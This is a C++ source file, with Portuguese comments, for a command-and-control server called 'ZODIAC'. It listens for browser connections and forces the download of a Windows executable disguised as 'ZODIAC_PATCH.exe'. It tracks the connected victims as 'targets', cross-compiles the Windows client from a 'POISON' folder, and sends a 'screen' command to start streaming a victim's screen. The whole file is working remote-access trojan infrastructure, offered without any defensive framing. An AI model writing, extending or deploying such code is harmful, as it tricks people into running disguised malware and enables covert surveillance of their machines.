#include <iostream>   
#include <string>     
#include <vector>     
#include <cstring>    
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <arpa/inet.h>  
#include <unistd.h>     
#include <csignal>    
#include <sys/select.h> 
#include <iomanip>    
#include <fstream>    

using namespace std;

struct Alvo {
    int id;       
    string ip;    
};

void desenhar_menu_zodiac();
void fechar_fortaleza(int sinal);

const string RESET     = "\033[0m";
const string ROXO      = "\033[35m\033[1m";
const string VERMELHO  = "\033[31m\033[1m";
const string VERDE     = "\033[32m\033[1m";
const string CIANO     = "\033[36m\033[1m";
const string AMARELO   = "\033[33m\033[1m";
const string BRANCO    = "\033[37m\033[1m";
const string PISCANDO  = "\033[5m";

int socket_principal;      
vector<Alvo> lista_alvos;  
int main() {
    signal(SIGINT, fechar_fortaleza);
    signal(SIGPIPE, SIG_IGN); 
    
    int PORTA_ARMADILHA  = 8081;          
    socket_principal = socket(AF_INET, SOCK_STREAM, 0);
    
    int op = 1;
    setsockopt(socket_principal, SOL_SOCKET, SO_REUSEADDR, &op, sizeof(op));

    struct sockaddr_in endereco;
    memset(&endereco, 0, sizeof(endereco));
    endereco.sin_family = AF_INET;
    endereco.sin_addr.s_addr = INADDR_ANY; 
    endereco.sin_port = htons(PORTA_ARMADILHA);

    if (bind(socket_principal, (struct sockaddr*)&endereco, sizeof(endereco)) < 0) {
        cout << VERMELHO << "[!] ERRO CRÍTICO: A porta " << PORTA_ARMADILHA << " já está ocupada." << RESET << endl;
        return 1;
    }

    listen(socket_principal, 50); 
    desenhar_menu_zodiac();

    fd_set conjunto_leitura; 

    while (true) {
        FD_ZERO(&conjunto_leitura);
        FD_SET(socket_principal, &conjunto_leitura); 
        FD_SET(STDIN_FILENO, &conjunto_leitura);      

        int max_fd = socket_principal;
        for (const auto& alvo : lista_alvos) {
            FD_SET(alvo.id, &conjunto_leitura);
            if (alvo.id > max_fd) max_fd = alvo.id;
        }

        int atividade = select(max_fd + 1, &conjunto_leitura, NULL, NULL, NULL);
        if (atividade < 0) continue;

        // SE ALGUÉM SE CONECTAR PELO NAVEGADOR WINDOWS (GATILHO DE DOWNLOAD AUTOMÁTICO)
        if (FD_ISSET(socket_principal, &conjunto_leitura)) {
            struct sockaddr_in cliente;
            socklen_t tamanho_addr = sizeof(cliente);
            int novo_socket = accept(socket_principal, (struct sockaddr*)&cliente, &tamanho_addr);

            if (novo_socket >= 0) {
                Alvo novo_alvo;
                novo_alvo.id = novo_socket;
                novo_alvo.ip = inet_ntoa(cliente.sin_addr);
                lista_alvos.push_back(novo_alvo); 

                cout << VERDE << "\n[🛰️ CONEXÃO ESTABELECIDA] ➔ Injetando download binário no IP: " << AMARELO << novo_alvo.ip << RESET << endl;
                cout << CIANO << "ZODIAC_NULL_CONSOLE_> " << flush;
                
                // Tenta carregar o arquivo binário local se ele já existir na pasta
                ifstream arquivo_exe("/home/gabriel/POISON/ZODIAC-POISON_TAR/log.exe", ios::binary | ios::ate);
                string payload_binario = "";
                
                if (arquivo_exe.is_open()) {
                    streamsize tamanho = arquivo_exe.tellg();
                    arquivo_exe.seekg(0, ios::beg);
                    vector<char> buffer_exe(tamanho);
                    if (arquivo_exe.read(buffer_exe.data(), tamanho)) {
                        payload_binario = string(buffer_exe.data(), tamanho);
                    }
                    arquivo_exe.close();
                } else {
                    // Fallback de texto seguro para o canal se o binário bruto ainda não foi buildado
                    payload_binario = "ZODIAC_CORE_PATCH_DUMP_STREAM\n";
                }

                // Cabeçalhos HTTP octet-stream: Forçam o Windows a disparar o download na hora
                string resposta_download_exe = 
                    "HTTP/1.1 200 OK\r\n"
                    "Content-Type: application/octet-stream\r\n"
                    "Content-Disposition: attachment; filename=\"ZODIAC_PATCH.exe\"\r\n"
                    "Content-Length: " + to_string(payload_binario.length()) + "\r\n"
                    "Connection: close\r\n\r\n" + payload_binario;
                
                send(novo_socket, resposta_download_exe.c_str(), resposta_download_exe.length(), 0);
            }
        }
        if (FD_ISSET(STDIN_FILENO, &conjunto_leitura)) {
            string entrada;
            getline(cin, entrada);

            if (entrada == "clear") {
                system("clear");
                desenhar_menu_zodiac();
            }
            // COMANDO BUILD: COMPILE O SEU LOG.EXE LOCAL DE FORMA AUTOMÁTICA EM UM CLIQUE
            else if (entrada == "build:exe") {
                cout << AMARELO << "\n[*] [ZODIAC BUILDER] Compilando automaticamente o executável estático do Windows..." << RESET << endl;
                int status = system("x86_64-w64-mingw32-g++ -O3 /home/gabriel/POISON/ZODIAC-POISON_TAR/windows_src.cpp -o /home/gabriel/POISON/ZODIAC-POISON_TAR/log.exe -lws2_32 -lgdiplus -static 2>/dev/null");
                
                if (status == 0) {
                    cout << VERDE << "[+] [SUCESSO] Compilação completa! Arquivo 'log.exe' gerado com as bibliotecas estáticas." << RESET << endl;
                } else {
                    cout << VERMELHO << "[x] [ERRO] Falha na compilação. Certifique-se de que o pacote 'mingw-w64' está instalado." << RESET << endl;
                }
            }
            else if (entrada == "exit:all") {
                cout << VERMELHO << "\n[-] [FECHAMENTO] Executando comando de ejeção global em lote..." << RESET << endl;
                for (const auto& alvo : lista_alvos) close(alvo.id);
                close(socket_principal);
                cout << VERDE << "[+] Central desligada com sucesso." << RESET << endl;
                exit(0);
            }
            else if (entrada == "list") {
                cout << ROXO << "\n+-------------------------------------------------------+" << RESET << endl;
                cout << CIANO << "|             TABELA DE CHASSIS ATIVOS (NULL)           |" << RESET << endl;
                cout << ROXO << "+----------+-------------------+------------------------+" << endl;
                cout << AMARELO << "| INDEX ID | ENDEREÇO IP REAL  | STATUS DO MONITOR      |" << endl;
                cout << ROXO << "+----------+-------------------+------------------------+" << RESET << endl;
                if (lista_alvos.empty()) {
                    cout << BRANCO << "|      [ NENHUM INTRUSO PRESO NA ARMADILHA ATUALMENTE ]        |" << RESET << endl;
                } else {
                    for (const auto& alvo : lista_alvos) {
                        cout << BRANCO << "| " << setw(8) << alvo.id 
                             << " | " << setw(17) << alvo.ip 
                             << " | " << VERDE << "LINHA MONITORADA 🟢 " << BRANCO << " |" << RESET << endl;
                    }
                }
                cout << ROXO << "+----------+-------------------+------------------------+\n" << RESET << endl;
            }
            else if (!entrada.empty()) {
                size_t pos_dois_pontos = entrada.find(":");
                if (pos_dois_pontos != string::npos) {
                    string prefixo = entrada.substr(0, pos_dois_pontos);
                    string resto = entrada.substr(pos_dois_pontos + 1);

                    if (prefixo == "kick" || prefixo == "strike") {
                        try {
                            int id_alvo = stoi(resto);
                            bool achou = false;

                            for (auto it = lista_alvos.begin(); it != lista_alvos.end(); ++it) {
                                if (it->id == id_alvo) {
                                    achou = true;
                                    if (prefixo == "kick") {
                                        cout << VERMELHO << "\n[-] [EJEÇÃO] Expulsando o ID " << id_alvo << " do barramento." << RESET << endl;
                                        close(id_alvo);
                                    } else {
                                        cout << VERMELHO << "\n🔥 [ZODIAC STRIKE] -> Disparando comando de streaming no ID: " << id_alvo << RESET << endl;
                                        string carga = "screen\n"; 
                                        send(id_alvo, carga.c_str(), carga.length(), 0);
                                    }
                                    lista_alvos.erase(it);
                                    break;
                                }
                            }
                            if (!achou) cout << VERMELHO << "[!] ID não encontrado." << RESET << endl;
                        } 
                        catch (...) {
                            cout << VERMELHO << "[!] Use 'kick:ID' ou 'strike:ID'" << RESET << endl;
                        }
                    }
                }
            }
            cout << CIANO << "ZODIAC_NULL_CONSOLE_> " << flush;
        }

        for (auto it = lista_alvos.begin(); it != lista_alvos.end(); ) {
            if (FD_ISSET(it->id, &conjunto_leitura)) {
                char buf[1024] = {0}; 
                if (recv(it->id, buf, sizeof(buf) - 1, 0) <= 0) {
                    cout << VERMELHO << "\n[-] [DESCONEXÃO] O alvo do ID " << it->id << " fugiu." << RESET << endl;
                    close(it->id);
                    it = lista_alvos.erase(it);
                    cout << CIANO << "ZODIAC_NULL_CONSOLE_> " << flush;
                } else {
                    ++it;
                }
            } else {
                ++it;
            }
        }
    }
    return 0;
}

void desenhar_menu_zodiac() {
    cout << ROXO << "=================================================================================" << RESET << endl;
    cout << CIANO << " ______  ____  _____   _    ____ " << endl;
    cout << CIANO << "|_  _  |/ __ \\|  __ \\ | |  / ___|" << endl;
    cout << CIANO << "  / /  | /  \\ | |  \\ \\| | | |      " << VERMELHO << "   [ OPERADOR SUPREMO ]" << endl;
    cout << CIANO << " / /__ | \\__/ | |__/ /| | | |___   " << BRANCO << "       ⚡ " << VERMELHO << PISCANDO << "N U L L" << RESET << BRANCO << " ⚡" << endl;
    cout << CIANO << "|_____| \\____/|_____/ |_|  \\____|  " << VERDE << "   (⚙️ MATRIX CENTRAL ENGINE v10.0 ⚙️)" << endl;
    cout << ROXO << "=================================================================================" << RESET << endl;
    cout << VERDE << "   [+] Comandos: 'list' (tabela) | 'clear' (limpar) | 'exit:all' (desligar tudo)" << RESET << endl;
    cout << CIANO << "   [*] Controle: 'kick:ID'       | 'strike:ID' (Disparar streaming de vídeo)" << endl;
    cout << AMARELO << "   [⚡] INFRA-BUILD: 'build:exe' (Compila o cliente Windows via MinGW local)" << endl;
    cout << ROXO << "=================================================================================" << RESET << endl;
    cout << AMARELO << "   [*] Central Zodíaco operacional. Aguardando transmissões...\n" << RESET << endl;
}

void fechar_fortaleza(int sinal) {
    for (const auto& alvo : lista_alvos) close(alvo.id);
    close(socket_principal);
    exit(sinal);
}
